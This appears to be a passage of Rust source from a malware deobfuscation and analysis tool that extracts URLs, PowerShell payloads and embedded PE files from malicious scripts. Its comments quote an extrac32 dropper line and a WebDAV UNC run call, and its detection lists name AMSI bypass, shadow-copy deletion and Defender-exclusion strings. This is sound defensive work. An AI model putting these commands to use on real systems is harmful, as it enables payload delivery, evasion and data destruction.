    // their IOCs literally bracketed in `!`. Auto-enable delayed
    // expansion when at least one `!IDENT!` reference exists and the
    // script doesn't explicitly DISABLE it. Real `setlocal
    // enabledelayedexpansion` / `cmd /v:on` codepaths re-set this same
    // flag, so this only matters when both are missing.
    if has_bang_var_reference(input) && !has_disable_delayed_expansion(input) {
        env.delayed_expansion = true;
    }
    pre_scan_polyglot_script_block(input, &mut env);
    deob_scan::scan_raw_marker_powershell_urls(input, &mut env);
    profile_mark!("setup_and_prescan");
    if looks_like_pe(input) {
        env.traits.push(Trait::DisguisedBinary {
            format: "pe".to_string(),
            size: input.len() as u64,
        });
        env.recovered_pe
            .push(("disguised-pe-input".to_string(), input.to_vec()));
        scan_binary_input_urls(input, &mut env);
        profile_mark!("binary_input");
    } else if let Some(fmt) = detect_disguised_binary(input) {
        // Non-PE binary formats masquerading as `.bat`/`.cmd`/`.ps1`
        // (CAB / ZIP / RAR / 7z / LNK / PDF / image). Persist the bytes
        // so analysts can pull the real file out — same dump mechanism
        // as the AES-recovered PE blobs.
        env.traits.push(Trait::DisguisedBinary {
            format: fmt.to_string(),
            size: input.len() as u64,
        });
        env.recovered_pe
            .push((format!("disguised-{fmt}-input"), input.to_vec()));
        scan_binary_input_urls(input, &mut env);
        profile_mark!("binary_input");
    } else {
        if let Some(decoded) = decode_utf16le_script_blob(input) {
            pre_scan_utf16_script_blob(&decoded, &mut env);
            out = decoded;
        } else {
            drive(input, &mut env, &mut out);
        }
        profile_mark!("drive");
        out = summarize_large_pem_blocks(&out);
        profile_mark!("summarize_pem");
        out = summarize_long_rem_comment_lines(&out, &mut env);
        profile_mark!("summarize_rem_comments");
        out = summarize_binary_noise_line_runs(&out, &mut env);
        profile_mark!("summarize_binary_noise");
        out = summarize_nul_padding_lines(&out, &mut env);
        profile_mark!("summarize_nul_padding");
        let raw_text = String::from_utf8_lossy(input);
        let raw_text_for_embedded = {
            let mut scratch = env.clone();
            summarize_nul_padding_lines(&raw_text, &mut scratch)
        };
        deob_scan::scan_embedded_powershell_invocations(&raw_text_for_embedded, &mut env);
        deob_scan::scan_embedded_powershell_invocations(&out, &mut env);
        deob_scan::scan_renamed_powershell_invocations(&out, &mut env);
        env.all_extracted_ps1
            .extend(std::mem::take(&mut env.exec_ps1));
        profile_mark!("embedded_ps");
        analyze_extracted_payloads(&mut env, &mut out, 1);
        profile_mark!("extracted_payloads");
        if !env.check_deadline() {
            ps1_scan::extract_self_embedded_ps1(&mut env, &out);
        }
        out = summarize_self_tail_base64_payloads(&out, &mut env);
        profile_mark!("self_embedded_ps1");
        if !env.check_deadline() {
            ps1_scan::scan_ps1_payloads(&mut env);
        }
        profile_mark!("ps1_scan");
        if !env.check_deadline() {
            vbs_scan::scan_vbs_payloads(&mut env);
        }
        profile_mark!("vbs_scan");
        if !env.check_deadline() {
            js_scan::scan_js_payloads(&mut env);
        }
        profile_mark!("js_scan");
        if !env.check_deadline() {
            ps1_scan::scan_inline_powershell_text(&out, &mut env);
        }
        profile_mark!("inline_ps");
        if !env.check_deadline() {
            deob_scan::scan_deob_text(&out, &mut env);
        }
        profile_mark!("scan_deob_text");
        // The char-index-extractor scan needs the FULL source — our
        // normalize pipeline's marker-noise stripping can mangle the
        // PS body that hosts the `function Musculos…` definition
        // (订单列表.bat is 4 KB on one line but the deob is ~2 KB with
        // the body split). Run it again over the raw input so the
        // call sites are intact.
        if !env.check_deadline() {
            deob_scan::scan_ps_char_index_extractor_urls(&raw_text, &mut env);
        }
        profile_mark!("raw_ps_char_index");
        // .js samples that wrap their HTA/JS payload in
        // `unescape('%XX%XX…')` (8 corpus samples, gov-cn.cloud
        // family) get the URLs hidden inside URL-encoded blobs. The
        // call from `scan_deob_text(&out)` only sees the post-drive()
        // output; for .js files most of the original `unescape(...)`
        // calls only exist in `raw_text`. Run it there too.
        if !env.check_deadline() {
            deob_scan::scan_js_unescape_urls(&raw_text, &mut env);
        }
        profile_mark!("raw_js_unescape");
        if !env.check_deadline() {
            deob_scan::scan_inline_b64_urls(&out, &mut env);
        }
        if !env.check_deadline() {
            deob_scan::scan_bare_b64_urls(&out, &mut env);
        }
        if !env.check_deadline() {
            deob_scan::scan_b64_url_prefix(&out, &mut env);
        }
        if !env.check_deadline() {
            deob_scan::scan_ps_char_concat_urls(&out, &mut env);
        }
        if !env.check_deadline() {
            deob_scan::scan_truncated_url_vars(&out, &mut env);
        }
        if !env.check_deadline() {
            deob_scan::scan_certutil_decoded_js(&out, &mut env);
        }
        if !env.check_deadline() {
            deob_scan::scan_echoed_unicode_js(&out, &mut env);
        }
        if !env.check_deadline() {
            deob_scan::scan_delim_wrapped_urls(&out, &mut env);
        }
        if !env.check_deadline() {
            deob_scan::scan_bare_ip_urls(&out, &mut env);
        }
        if !env.check_deadline() {
            deob_scan::scan_decimal_ip_urls(&out, &mut env);
        }
        profile_mark!("url_family_scans");
        if !env.check_deadline() {
            deob_scan::scan_multistage_encrypted_dropper(&out, &mut env);
        }
        profile_mark!("multistage_dropper");
        if !env.check_deadline() {
            aes_chain::extract_from_chain(input, &out, &mut env);
        }
        profile_mark!("aes_chain");
        if !env.check_deadline() {
            deob_scan::scan_unc_webdav(&out, &mut env);
        }
        profile_mark!("unc_webdav");
    }
    // Also walk JS/VBS payloads for UNC C2 patterns — the deob text only
    // contains CMD code; an `objShell.Run('\\\\host@SSL\\DavWWWRoot\\...')`
    // inside a `<script>` block (polyglot .bat) never reaches `out` so we
    // scan the raw payload bodies directly.
    let mut jscript_bodies = std::mem::take(&mut env.all_extracted_jscript);
    let mut vbs_bodies = std::mem::take(&mut env.all_extracted_vbs);
    let mut ps1_bodies = std::mem::take(&mut env.all_extracted_ps1);
    for body in jscript_bodies
        .iter()
        .chain(vbs_bodies.iter())
        .chain(ps1_bodies.iter())
    {
        if env.check_deadline() {
            break;
        }
        let text = String::from_utf8_lossy(body);
        deob_scan::scan_unc_webdav(&text, &mut env);
    }
    jscript_bodies.append(&mut env.all_extracted_jscript);
    env.all_extracted_jscript = jscript_bodies;
    vbs_bodies.append(&mut env.all_extracted_vbs);
    env.all_extracted_vbs = vbs_bodies;
    ps1_bodies.append(&mut env.all_extracted_ps1);
    env.all_extracted_ps1 = ps1_bodies;
    profile_mark!("payload_unc_webdav");
    // Filter out Download traits whose `src` URL is noise (unresolved
    // `%%X` loop vars, `%foo%` undefined refs, bad IPs, well-known scrape
    // hosts). Several handlers (cmd.rs, curl.rs) push Trait::Download
    // directly without going through `scan_deob_text`'s is_noise_url
    // gate, so these slipped through to the report as false-positive
    // IOCs. win.bat (fb8bb3cf…) → 18× `http://%%B/…` URLs vanished
    // after this filter.
    env.traits.retain(|t| match t {
        Trait::Download { src, .. } | Trait::DownloadInDeobText { src, .. } => {
            !deob_scan::is_noise_url(src)
        }
        Trait::CertutilDownload { url, .. } | Trait::BitsadminDownload { url, .. } => {
            !deob_scan::is_noise_url(url)
        }
        Trait::UrlVariable { url, .. } => !deob_scan::is_noise_url(url),
        _ => true,
    });
    dedup_traits(&mut env.traits, cfg.max_traits_per_kind);
    profile_mark!("filter_and_dedup");
    let extracted_ps1_normalized: Vec<String> = env
        .all_extracted_ps1
        .iter()
        .map(|bytes| ps1_scan::normalize_ps1_payload(bytes))
        .collect();
    profile_mark!("normalize_ps1_payloads");
    // Surface decoded/extracted PowerShell payloads in the deob with a
    // banner so analysts can read the reconstructed PS body — critical
    // for set-fragment-assembled `$ddsdfgo = '<b64>'; iex $x` chains
    // (SOSTENER family) where the host URL only appears inside the
    // base64-decoded body, never as plaintext in the bat. User feedback:
    // "command lines are just as important". We dedupe by checking if
    // the normalized payload's first non-trivial line is already present
    // in `out` — avoids re-emitting plain inline `powershell -c "…"`
    // commands the lex/normalize already rendered.
    let mut emitted_ps_keys: std::collections::HashSet<String> = std::collections::HashSet::new();
    let mut appended_payload_scan_start = None;
    for ps in &extracted_ps1_normalized {
        let trimmed = ps.trim();
        if trimmed.is_empty() {
            continue;
        }
        // Build a stable dedupe key from the first 120 chars of the
        // first non-empty line (avoids `$var = 'X'; iex` vs `$var='X';iex`
        // mismatches but still catches identical payloads).
        let first_line: String = trimmed
            .lines()
            .find(|l| !l.trim().is_empty())
            .unwrap_or("")
            .chars()
            .take(120)
            .collect();
        if first_line.is_empty() || !emitted_ps_keys.insert(first_line.clone()) {
            continue;
        }
        // Skip if a meaningful slice of the payload already shows in the
        // deob — `Convert::FromBase64String('SGVsbG8=')` style invocations
        // are already rendered by the regular dispatch path.
        let sample: String = first_line.chars().take(60).collect();
        if sample.len() >= 16 && out.contains(&sample) {
            continue;
        }
        // Detect the language of the extracted payload so the banner
        // accurately reflects what the analyst is reading. The
        // all_extracted_ps1 vec contains anything that the dispatch path
        // routed through the powershell handler OR was reconstructed via
        // set-fragment / WebDAV-UNC patterns — these can be CMD net-use
        // + rundll32 / regsvr32 chains, not actual PS.
        let lc = trimmed.to_ascii_lowercase();
        let kind = if trimmed.starts_with('$')
            || lc.contains("invoke-")
            || trimmed.contains("[System.")
            || trimmed.contains("[Reflection.")
            || lc.contains("powershell")
            || lc.contains("iex ")
            || lc.contains("iex(")
            || trimmed.contains("-Command")
            // Common PS cmdlet prefixes (Verb-Noun pattern)
            || lc.contains("new-object")
            || lc.contains("start-process")
            || lc.contains("get-content")
            || lc.contains("get-process")
            || lc.contains("set-content")
            || lc.contains("write-host")
            || lc.contains("add-mppreference")
            || lc.contains("set-mppreference")
            || lc.contains(".downloadfile(")
            || lc.contains(".downloadstring(")
            || lc.contains("compress-archive")
            || lc.contains("convertfrom-base64")
            || lc.contains(".webclient")
        {
            "PowerShell"
        } else if lc.starts_with("net use ") || lc.contains("rundll32 ") || lc.contains("regsvr32 ")
        {
            "CMD/UNC-C2"
        } else if trimmed.contains("CreateObject(") || trimmed.contains("WScript.") {
            "VBS/JScript"
        } else {
            "child"
        };
        let scan_start = *appended_payload_scan_start.get_or_insert(out.len());
        out.push_str(&format!(
            "\r\n::==== harrington: extracted {kind} payload ====\r\n"
        ));
        out.push_str(ps.trim_end());
        if !ps.ends_with('\n') {
            out.push_str("\r\n");
        }
        out.push_str(&format!("::==== end extracted {kind} payload ====\r\n"));
        debug_assert!(scan_start <= out.len());
    }
    // Run targeted scans on the FINAL `out` so detectors that live in
    // scan_deob_text but are gated on banner-only text (PS payloads
    // surfaced after the initial scan_deob_text pass) still fire.
    // Currently: in-memory .NET assembly load detection — common in
    // the SOSTENER/banglabillboard family whose Reflection.Assembly]::Load
    // call is inside the base64-decoded PS body that didn't exist when
    // the first scan_deob_text ran.
    // Keep the historical final scan for normal-sized output: several
    // command-line workflows rely on this late pass for compact URL/download
    // summaries. For multi-MiB output where no extracted payload was appended,
    // the scan is an exact duplicate of the earlier deob scan and can dominate
    // runtime on BatCloak-style reconstruction output.
    const MAX_UNCHANGED_FINAL_SCAN_BYTES: usize = 1024 * 1024;
    if let Some(scan_start) = appended_payload_scan_start {
        deob_scan::scan_deob_text(&out[scan_start..], &mut env);
        // Re-run dedup since the post-banner scan may have emitted dupes.
        let max_per_kind = cfg.max_traits_per_kind;
        dedup_traits(&mut env.traits, max_per_kind);
    } else if out.len() <= MAX_UNCHANGED_FINAL_SCAN_BYTES {
        deob_scan::scan_deob_text(&out, &mut env);
        // Re-run dedup since the post-banner scan may have emitted dupes.
        let max_per_kind = cfg.max_traits_per_kind;
        dedup_traits(&mut env.traits, max_per_kind);
    }
    collect_ps1_self_tail_reversed_gzip_pe(input, &extracted_ps1_normalized, &mut env);
    let raw_input_text = String::from_utf8_lossy(input);
    collect_embedded_base64_pe_carrier_artifacts(&raw_input_text, &mut env);
    out = summarize_multiline_base64_pe_carrier_blocks(out, &mut env);
    scan_recovered_artifact_strings(&mut env);
    dedup_traits(&mut env.traits, cfg.max_traits_per_kind);
    profile_mark!("final_scan_and_dedup");
    let _ = profile_last;
    Report {
        deobfuscated: out,
        traits: std::mem::take(&mut env.traits),
        extracted_cmd: std::mem::take(&mut env.all_extracted_cmd),
        extracted_ps1: std::mem::take(&mut env.all_extracted_ps1),
        extracted_ps1_normalized,
        recovered_pe: std::mem::take(&mut env.recovered_pe),
    }
}

fn scan_recovered_artifact_strings(env: &mut Environment) {
    let mut artifacts = std::mem::take(&mut env.recovered_pe);
    for (_, blob) in &artifacts {
        scan_binary_input_urls(blob, env);
        let behavior_text = recovered_artifact_behavior_text(blob);
        if !behavior_text.is_empty() {
            deob_scan::scan_deob_text(&behavior_text, env);
        }
    }
    artifacts.append(&mut env.recovered_pe);
    env.recovered_pe = artifacts;
}

fn summarize_multiline_base64_pe_carrier_blocks(text: String, env: &mut Environment) -> String {
    let mut out = String::with_capacity(text.len());
    let mut block: Vec<&str> = Vec::new();
    let mut changed = false;

    for line in text.lines() {
        let trimmed = line.trim();
        let is_base64_line = !trimmed.is_empty() && trimmed.bytes().all(is_base64_byte);
        if is_base64_line && (trimmed.len() >= 64 || !block.is_empty()) {
            block.push(trimmed);
            continue;
        }
        changed |= flush_base64_pe_block(&mut out, &mut block, env);
        out.push_str(line);
        out.push_str("\r\n");
    }
    changed |= flush_base64_pe_block(&mut out, &mut block, env);

    if changed {
        out
    } else {
        text
    }
}

fn flush_base64_pe_block(out: &mut String, block: &mut Vec<&str>, env: &mut Environment) -> bool {
    if block.is_empty() {
        return false;
    }

    let total_len: usize = block.iter().map(|line| line.len()).sum();
    if total_len >= 4096 {
        let padding = block
            .last()
            .map(|line| line.bytes().rev().take_while(|b| *b == b'=').count())
            .unwrap_or(0);
        let decoded_estimate = (total_len / 4).saturating_mul(3).saturating_sub(padding);
        if let Some((label_kind, pe)) = decode_base64_pe_carrier_block(block) {
            let is_hex = label_kind == "embedded-base64-hex-pe";
            push_recovered_pe_artifact(env, label_kind, pe);
            let description = if is_hex {
                "multiline base64-encoded hex PE carrier"
            } else {
                "multiline base64 PE carrier"
            };
            let bytes_label = if is_hex { "hex bytes" } else { "decoded bytes" };
            out.push_str(&format!(
                "::==== harrington: omitted {description} ({} lines, {} base64 bytes, ~{} {bytes_label}) ====\r\n",
                block.len(),
                total_len,
                decoded_estimate
            ));
            block.clear();
            return true;
        }
        if classify_base64_pe_block(block).is_some() {
            out.push_str(&format!(
                "::==== harrington: omitted multiline base64 PE carrier ({} lines, {} base64 bytes, ~{} decoded bytes) ====\r\n",
                block.len(),
                total_len,
                decoded_estimate
            ));
            block.clear();
            return true;
        }
    }

    for line in block.drain(..) {
        out.push_str(line);
        out.push_str("\r\n");
    }
    false
}

fn classify_base64_pe_block(block: &[&str]) -> Option<()> {
    use base64::Engine;

    let mut prefix = String::new();
    for line in block {
        let need = 256usize.saturating_sub(prefix.len());
        if need == 0 {
            break;
        }
        prefix.push_str(&line[..need.min(line.len())]);
    }
    let prefix_len = prefix.len() - (prefix.len() % 4);
    if prefix_len < 4 {
        return None;
    }
    let decoded = base64::engine::general_purpose::STANDARD
        .decode(&prefix[..prefix_len])
        .ok()?;
    if decoded.starts_with(b"MZ")
        || decoded
            .get(..4)
            .is_some_and(|head| head.eq_ignore_ascii_case(b"4d5a"))
    {
        Some(())
    } else {
        None
    }
}

fn collect_embedded_base64_pe_carrier_artifacts(text: &str, env: &mut Environment) {
    const MAX_EMBEDDED_PE_CARRIER_ARTIFACTS: usize = 16;

    let mut block: Vec<&str> = Vec::new();
    let mut recovered_count = 0usize;
    for line in text.lines() {
        let trimmed = line.trim();
        let is_base64_line = !trimmed.is_empty() && trimmed.bytes().all(is_base64_byte);
        if is_base64_line && (trimmed.len() >= 64 || !block.is_empty()) {
            block.push(trimmed);
            continue;
        }
        recovered_count += flush_embedded_base64_pe_artifact_block(
            env,
            &mut block,
            recovered_count,
            MAX_EMBEDDED_PE_CARRIER_ARTIFACTS,
        );
    }
    flush_embedded_base64_pe_artifact_block(
        env,
        &mut block,
        recovered_count,
        MAX_EMBEDDED_PE_CARRIER_ARTIFACTS,
    );
}

fn flush_embedded_base64_pe_artifact_block(
    env: &mut Environment,
    block: &mut Vec<&str>,
    recovered_count: usize,
    max_artifacts: usize,
) -> usize {
    if block.is_empty() || recovered_count >= max_artifacts {
        block.clear();
        return 0;
    }
    let total_len: usize = block.iter().map(|line| line.len()).sum();
    if total_len < 4096 {
        block.clear();
        return 0;
    }
    let decoded = decode_base64_pe_carrier_block(block);
    block.clear();
    let Some((label_kind, pe)) = decoded else {
        return 0;
    };
    usize::from(push_recovered_pe_artifact(env, label_kind, pe))
}

fn decode_base64_pe_carrier_block(block: &[&str]) -> Option<(&'static str, Vec<u8>)> {
    use base64::Engine;

    let total_len: usize = block.iter().map(|line| line.len()).sum();
    if total_len > 16 * 1024 * 1024 {
        return None;
    }
    let mut compact = String::with_capacity(total_len);
    for line in block {
        compact.push_str(line.trim());
    }
    let decoded = base64::engine::general_purpose::STANDARD
        .decode(compact.as_bytes())
        .ok()?;
    if looks_like_pe(&decoded) {
        return Some(("embedded-base64-pe", decoded));
    }
    if decoded.len() <= 32 * 1024 * 1024
        && decoded
            .get(..4)
            .is_some_and(|head| head.eq_ignore_ascii_case(b"4d5a"))
    {
        let hex = String::from_utf8(decoded).ok()?;
        let compact_hex: String = hex.chars().filter(|c| !c.is_ascii_whitespace()).collect();
        if compact_hex.len() % 2 == 0 {
            let bytes = hex::decode(compact_hex).ok()?;
            if looks_like_pe(&bytes) {
                return Some(("embedded-base64-hex-pe", bytes));
            }
        }
    }
    None
}

fn collect_ps1_self_tail_reversed_gzip_pe(
    input: &[u8],
    normalized_ps1: &[String],
    env: &mut Environment,
) {
    use std::io::Read as _;

    if !normalized_ps1.iter().any(|ps| {
        let lc = ps.to_ascii_lowercase();
        lc.contains("getcurrentprocess")
            && lc.contains("readlines")
            && lc.contains("select-object -last 1")
            && lc.contains("frombase64string")
            && lc.contains("gzipstream")
            && lc.contains("[array]::reverse")
            && lc.contains("assembly]::load")
    }) {
        return;
    }
    let raw_text = String::from_utf8_lossy(input);
    let Some(last_line) = raw_text
        .lines()
        .rev()
        .map(str::trim)
        .find(|line| !line.is_empty())
    else {
        return;
    };
    if last_line.len() < 64 || last_line.len() > 16 * 1024 * 1024 {
        return;
    }
    if !last_line.bytes().all(is_base64_byte) {
        return;
    }
    let Ok(gz) = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, last_line)
    else {
        return;
    };
    let mut decoder = flate2::read::GzDecoder::new(gz.as_slice());
    let mut reversed = Vec::new();
    if std::io::Read::take(&mut decoder, 16 * 1024 * 1024)
        .read_to_end(&mut reversed)
        .is_err()
    {
        return;
    }
    reversed.reverse();
    if !looks_like_pe(&reversed) {
        return;
    }
    if push_recovered_pe_artifact(env, "ps1-self-tail-reversed-gzip-pe", reversed.clone()) {
        scan_binary_input_urls(&reversed, env);
    }
}

fn push_recovered_pe_artifact(
    env: &mut Environment,
    label_kind: &'static str,
    pe: Vec<u8>,
) -> bool {
    const MAX_SAME_KIND: usize = 16;

    let same_kind_count = env
        .recovered_pe
        .iter()
        .filter(|(label, _)| label.starts_with(label_kind))
        .count();
    if same_kind_count >= MAX_SAME_KIND {
        return false;
    }
    if env
        .recovered_pe
        .iter()
        .any(|(existing, blob)| existing.starts_with(label_kind) && blob == &pe)
    {
        return false;
    }
    let label = if same_kind_count == 0 {
        label_kind.to_string()
    } else {
        format!("{label_kind}#{}", same_kind_count + 1)
    };
    env.recovered_pe.push((label, pe));
    true
}

fn summarize_base64_pe_carrier_line(line: &str) -> Option<String> {
    use base64::Engine;

    let trimmed = line.trim();
    if trimmed.len() < 4096 || trimmed.len() > 16 * 1024 * 1024 {
        return None;
    }
    if !trimmed.bytes().all(is_base64_byte) {
        return None;
    }

    let prefix_len = 256.min(trimmed.len() - (trimmed.len() % 4));
    if prefix_len < 4 {
        return None;
    }
    let decoded_prefix = base64::engine::general_purpose::STANDARD
        .decode(&trimmed[..prefix_len])
        .ok()?;
    if !decoded_prefix.starts_with(b"MZ") {
        return None;
    }

    let padding = trimmed.bytes().rev().take_while(|b| *b == b'=').count();
    let decoded_estimate = (trimmed.len() / 4)
        .saturating_mul(3)
        .saturating_sub(padding);
    Some(format!(
        "::==== harrington: omitted base64 PE carrier ({} base64 bytes, ~{} decoded bytes) ====",
        trimmed.len(),
        decoded_estimate
    ))
}

fn recovered_artifact_behavior_text(blob: &[u8]) -> String {
    const MAX_STRINGS: usize = 512;
    let mut strings = Vec::new();
    collect_recovered_artifact_ascii_strings(blob, &mut strings, MAX_STRINGS);
    collect_recovered_artifact_utf16le_strings(blob, 0, &mut strings, MAX_STRINGS);
    collect_recovered_artifact_utf16le_strings(blob, 1, &mut strings, MAX_STRINGS);

    let mut seen = std::collections::HashSet::new();
    let mut text = String::new();
    for s in strings {
        if !recovered_artifact_string_is_behavior_hint(&s) || seen.contains(&s) {
            continue;
        }
        text.push_str(&s);
        text.push('\n');
        seen.insert(s);
    }
    text
}

fn collect_recovered_artifact_ascii_strings(
    blob: &[u8],
    strings: &mut Vec<String>,
    max_strings: usize,
) {
    const MIN_LEN: usize = 8;
    const MAX_LEN: usize = 8192;

    let mut run = Vec::new();
    for &b in blob {
        if b == b'\t' || (0x20..=0x7e).contains(&b) {
            run.push(b);
            if run.len() >= MAX_LEN {
                push_recovered_artifact_string(&mut run, strings, max_strings, MIN_LEN);
            }
        } else {
            push_recovered_artifact_string(&mut run, strings, max_strings, MIN_LEN);
        }
        if strings.len() >= max_strings {
            return;
        }
    }
    push_recovered_artifact_string(&mut run, strings, max_strings, MIN_LEN);
}

fn collect_recovered_artifact_utf16le_strings(
    blob: &[u8],
    offset: usize,
    strings: &mut Vec<String>,
    max_strings: usize,
) {
    const MIN_LEN: usize = 8;
    const MAX_LEN: usize = 8192;

    if offset >= blob.len() {
        return;
    }
    let mut run = Vec::new();
    for pair in blob[offset..].chunks_exact(2) {
        let ch = u16::from_le_bytes([pair[0], pair[1]]);
        if ch == u16::from(b'\t') || (0x20u16..=0x7eu16).contains(&ch) {
            run.push(ch as u8);
            if run.len() >= MAX_LEN {
                push_recovered_artifact_string(&mut run, strings, max_strings, MIN_LEN);
            }
        } else {
            push_recovered_artifact_string(&mut run, strings, max_strings, MIN_LEN);
        }
        if strings.len() >= max_strings {
            return;
        }
    }
    push_recovered_artifact_string(&mut run, strings, max_strings, MIN_LEN);
}

fn push_recovered_artifact_string(
    run: &mut Vec<u8>,
    strings: &mut Vec<String>,
    max_strings: usize,
    min_len: usize,
) {
    if run.len() >= min_len && strings.len() < max_strings {
        strings.push(String::from_utf8_lossy(run).to_string());
    }
    run.clear();
}

fn recovered_artifact_string_is_behavior_hint(s: &str) -> bool {
    const NEEDLES: &[&str] = &[
        "add-mppreference",
        "set-mppreference",
        "netsh advfirewall",
        "vssadmin",
        "shadowcopy delete",
        "bcdedit",
        "wbadmin",
        "[system.reflection.assembly]::load",
        "[reflection.assembly]::load",
        "amsiscanbuffer",
        "amsiinitfailed",
        "amsiutils",
        "etweventwrite",
    ];
    NEEDLES
        .iter()
        .any(|needle| ascii_case_insensitive_contains(s, needle))
}

fn ascii_case_insensitive_contains(haystack: &str, needle: &str) -> bool {
    if needle.is_empty() {
        return true;
    }
    if haystack.len() < needle.len() {
        return false;
    }
    haystack.as_bytes().windows(needle.len()).any(|window| {
        window
            .iter()
            .copied()
            .zip(needle.bytes())
            .all(|(h, n)| h.to_ascii_lowercase() == n)
    })
}

fn trait_kind(t: &Trait) -> String {
    serde_json::to_value(t.clone())
        .ok()
        .and_then(|v| {
            v.get("kind")
                .and_then(|k| k.as_str())
                .map(|s| s.to_string())
        })
        .unwrap_or_default()
}

fn semantic_dedup_key(t: &Trait) -> Option<String> {
    match t {
        Trait::Download { src, dst, .. } => {
            Some(format!("Download\0{src}\0{}", dst.as_deref().unwrap_or("")))
        }
        Trait::UrlLaunch { url, .. } => Some(format!("UrlLaunch\0{url}")),
        Trait::UrlArgument { url, .. } => Some(format!("UrlArgument\0{url}")),
        Trait::UrlVariable { name, url, .. } => Some(format!("UrlVariable\0{name}\0{url}")),
        Trait::RemoteConnect { host, port, .. } => Some(format!("RemoteConnect\0{host}\0{port}")),
        Trait::AccountModification {
            action,
            account,
            group,
            ..
        } => Some(format!(
            "AccountModification\0{action}\0{account}\0{}",
            group.as_deref().unwrap_or("")
        )),
        Trait::FileConcealment {
            target, attributes, ..
        } => Some(format!(
            "FileConcealment\0{target}\0{}",
            attributes.join(",")
        )),
        Trait::RemoteAccess {
            technique, target, ..
        } => Some(format!("RemoteAccess\0{technique}\0{target}")),
        Trait::EvidenceCleanup { action, target, .. } => {
            Some(format!("EvidenceCleanup\0{action}\0{target}"))
        }
        Trait::RegistryUrl { value, url, .. } => Some(format!("RegistryUrl\0{value}\0{url}")),
        Trait::CertutilDownload { url, dst } => Some(format!("CertutilDownload\0{url}\0{dst}")),
        Trait::BitsadminDownload { url, dst } => Some(format!("BitsadminDownload\0{url}\0{dst}")),
        Trait::DownloadInDeobText { src, .. } => Some(format!("DownloadInDeobText\0{src}")),
        Trait::UncWebDavC2 {
            share_path,
            http_url,
            ..
        } => Some(format!("UncWebDavC2\0{share_path}\0{http_url}")),
        _ => None,
    }
}

fn dedup_traits(traits: &mut Vec<Trait>, max_per_kind: u32) {
    use std::collections::HashMap;
    let mut semantic_seen = std::collections::HashSet::new();
    traits.retain(|t| {
        let Some(key) = semantic_dedup_key(t) else {
            return true;
        };
        semantic_seen.insert(key)
    });
    let mut exact_seen = std::collections::HashSet::new();
    traits.retain(|t| {
        let Ok(key) = serde_json::to_string(t) else {
            return true;
        };
        exact_seen.insert(key)
    });
    // Count by kind
    let mut counts: HashMap<String, u64> = HashMap::new();
    for t in traits.iter() {
        let kind = trait_kind(t);
        *counts.entry(kind).or_insert(0) += 1;
    }
    // Keep only the first max_per_kind of each kind
    let mut kept: HashMap<String, u32> = HashMap::new();
    traits.retain(|t| {
        let kind = trait_kind(t);
        let n = kept.entry(kind).or_insert(0);
        if *n < max_per_kind {
            *n += 1;
            true
        } else {
            false
        }
    });
    // Append summary records for any kind that was capped
    for (kind, total) in counts {
        if total > u64::from(max_per_kind) {
            traits.push(Trait::TraitsCapped {
                capped_kind: kind,
                total,
                kept: u64::from(max_per_kind),
            });
        }
    }
}

/// Detect a binary file format that the input *starts with*. Skips PE
/// (that's `looks_like_pe`'s job) since PE has its own URL-extraction
/// fast-path. Returns a short lowercase format tag suitable for use as
/// a file extension. Used for the "renamed installer / archive
/// delivered as `.bat`" case — the file isn't actually a batch script
/// at all, the OS dispatches by magic bytes when the user clicks it.
fn detect_disguised_binary(content: &[u8]) -> Option<&'static str> {
    if content.len() < 8 {
        return None;
    }
    // CAB: `MSCF` + 4 zero bytes (reserved1).
    if content.starts_with(b"MSCF\x00\x00\x00\x00") {
        return Some("cab");
    }
    // ZIP: `PK\x03\x04` (local file header) or `PK\x05\x06` (EOCD).
    if content.starts_with(b"PK\x03\x04") || content.starts_with(b"PK\x05\x06") {
        return Some("zip");
    }
    // RAR4 (`Rar!\x1a\x07\x00`) or RAR5 (`Rar!\x1a\x07\x01\x00`).
    if content.starts_with(b"Rar!\x1a\x07\x00") || content.starts_with(b"Rar!\x1a\x07\x01\x00") {
        return Some("rar");
    }
    // 7z: `7z\xbc\xaf\x27\x1c`.
    if content.starts_with(b"7z\xbc\xaf\x27\x1c") {
        return Some("7z");
    }
    // LNK (Windows shortcut): `L\x00\x00\x00\x01\x14\x02\x00\x00\x00\x00\x00`.
    if content.starts_with(b"L\x00\x00\x00\x01\x14\x02\x00\x00\x00\x00\x00") {
        return Some("lnk");
    }
    // PDF: `%PDF-`.
    if content.starts_with(b"%PDF-") {
        return Some("pdf");
    }
    // Common image magic bytes — would normally be benign but a
    // sample arriving as `.bat` with image magic is delivery-vector
    // suspicious enough to flag.
    if content.starts_with(b"\x89PNG\r\n\x1a\n") {
        return Some("png");
    }
    if content.starts_with(b"GIF87a") || content.starts_with(b"GIF89a") {
        return Some("gif");
    }
    if content.starts_with(b"\xff\xd8\xff") {
        return Some("jpg");
    }
    None
}

fn looks_like_pe(content: &[u8]) -> bool {
    if content.len() < 0x40 || content.get(0..2) != Some(b"MZ") {
        return false;
    }
    let Some(pe_off_bytes) = content.get(0x3c..0x40) else {
        return false;
    };
    let pe_off = u32::from_le_bytes([
        pe_off_bytes[0],
        pe_off_bytes[1],
        pe_off_bytes[2],
        pe_off_bytes[3],
    ]) as usize;
    pe_off
        .checked_add(4)
        .and_then(|end| content.get(pe_off..end))
        == Some(b"PE\0\0")
}

fn scan_binary_input_urls(input: &[u8], env: &mut Environment) {
    let mut known: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::Download { src, .. }
            | Trait::UrlLaunch { url: src, .. }
            | Trait::UrlArgument { url: src, .. }
            | Trait::UrlVariable { url: src, .. }
            | Trait::RegistryUrl { url: src, .. }
            | Trait::DownloadInDeobText { src, .. } => Some(src.clone()),
            _ => None,
        })
        .collect();
    for url in aes_chain::scan::scan_urls(input, 16) {
        if deob_scan::is_noise_url(&url) || !known.insert(url.clone()) {
            continue;
        }
        env.traits.push(Trait::DownloadInDeobText {
            src: url,
            line_hint: "binary-input".to_string(),
        });
    }
    // bat/CAB dual-detonation pattern: a CAB file whose header area
    // embeds a batch payload like
    //   `cls && extrac32 /y "%~f0" "%tmp%\x.exe" && start "" "%tmp%\x.exe"`
    // (15 corpus samples). The OS dispatches `.bat` extension → CMD,
    // which parses past the binary garbage and hits the embedded
    // batch line; alternatively the user double-clicks and the CAB
    // handler runs the embedded `x.exe`. Either way the static
    // payload sits in the first ~4 KB as printable ASCII.
    //
    // Carve every long-enough printable-ASCII run from the head and
    // feed each through `scan_deob_text` so the SelfExtract /
    // Extrac32 / Lolbas / DownloadInDeobText scanners fire.
    let head_limit = input.len().min(8192);
    let head = &input[..head_limit];
